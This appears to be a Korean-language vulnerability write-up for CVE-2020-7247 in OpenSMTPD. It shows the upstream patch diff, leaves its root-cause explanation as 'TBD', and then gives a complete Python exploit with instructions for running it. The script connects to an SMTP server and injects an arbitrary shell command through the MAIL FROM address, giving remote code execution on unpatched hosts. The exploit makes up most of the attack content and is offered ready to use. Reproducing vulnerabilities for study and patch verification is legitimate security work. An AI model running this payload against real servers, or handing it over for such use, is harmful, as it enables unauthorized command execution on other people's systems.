# Remote code execution in OpenSMTPD

## Information
- CVE : CVE-2020-7247
- 해당 소프트웨어 : OpenSMPTD
- 해당 버전 : OpenSMPTD < 6.6.2
- 취약점 유형 : etc

## Root Cause

### patch
```patch
diff --git a/usr.sbin/smtpd/smtp_session.c b/usr.sbin/smtpd/smtp_session.c
index f9cf444786d..1af4c6f9776 100644
--- a/usr.sbin/smtpd/smtp_session.c
+++ b/usr.sbin/smtpd/smtp_session.c
@@ -1,4 +1,4 @@
-/*	$OpenBSD: smtp_session.c,v 1.421 2020/01/08 00:05:38 gilles Exp $	*/
+/*	$OpenBSD: smtp_session.c,v 1.422 2020/01/28 21:35:00 gilles Exp $	*/
 
 /*
  * Copyright (c) 2008 Gilles Chehade <gilles@poolp.org>
@@ -2236,25 +2236,23 @@ smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
 		memmove(maddr->user, p, strlen(p) + 1);
 	}
 
-	if (!valid_localpart(maddr->user) ||
-	    !valid_domainpart(maddr->domain)) {
-		/* accept empty return-path in MAIL FROM, required for bounces */
-		if (mailfrom && maddr->user[0] == '\0' && maddr->domain[0] == '\0')
-			return (1);
+	/* accept empty return-path in MAIL FROM, required for bounces */
+	if (mailfrom && maddr->user[0] == '\0' && maddr->domain[0] == '\0')
+		return (1);
 
-		/* no user-part, reject */
-		if (maddr->user[0] == '\0')
-			return (0);
-
-		/* no domain, local user */
-		if (maddr->domain[0] == '\0') {
-			(void)strlcpy(maddr->domain, domain,
-			    sizeof(maddr->domain));
-			return (1);
-		}
+	/* no or invalid user-part, reject */
+	if (maddr->user[0] == '\0' || !valid_localpart(maddr->user))
 		return (0);
+
+	/* no domain part, local user */
+	if (maddr->domain[0] == '\0') {
+		(void)strlcpy(maddr->domain, domain,
+			sizeof(maddr->domain));
 	}
 
+	if (!valid_domainpart(maddr->domain))
+		return (0);
+
 	return (1);
 }
 
```

TBD


## Exploit
```python
from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Connected, sending payload')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'\r\nxxx\r\n.\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
print('[*] Done')
```

## How to run exploit?
> target OS : OpenBSD 6.6
> 
1) OpenBSD 6.6에서 openSMTP 서비스 활성화
2) 다른 호스트에서 exploit.py 실행(python exploit.py <target ip> <target port> <command>)

## Reference
- [mitre cve db](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247)
- [writeup by qualys](https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt)
- [firo solutions blog](https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/)